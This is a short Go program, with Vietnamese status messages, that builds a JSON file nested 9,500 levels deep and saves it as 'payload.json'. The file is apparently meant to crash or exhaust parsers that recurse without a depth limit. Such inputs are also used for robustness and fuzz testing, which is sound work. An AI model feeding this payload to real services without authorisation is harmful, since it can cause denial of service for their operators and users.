package main

import (
	"encoding/json"
	"fmt"
	"os"
)

const depth = 9500

func generateDeepJSON(d int) interface{} {
	if d <= 0 {
		return "end_of_nesting"
	}
	return map[string]interface{}{
		"nested_key": generateDeepJSON(d - 1),
	}
}

func main() {
	fmt.Printf("[*] Đang tạo payload JSON với độ sâu: %d...\n", depth)

	data := generateDeepJSON(depth)

	jsonData, err := json.Marshal(data)
	if err != nil {
		fmt.Println("[!] Lỗi khi chuyển đổi sang JSON:", err)
		os.Exit(1)
	}

	err = os.WriteFile("payload.json", jsonData, 0644)
	if err != nil {
		fmt.Println("[!] Lỗi khi ghi tệp payload.json:", err)
		os.Exit(1)
	}

	fmt.Printf("[+] Đã tạo thành công tệp 'payload.json' với độ sâu %d.\n", depth)
}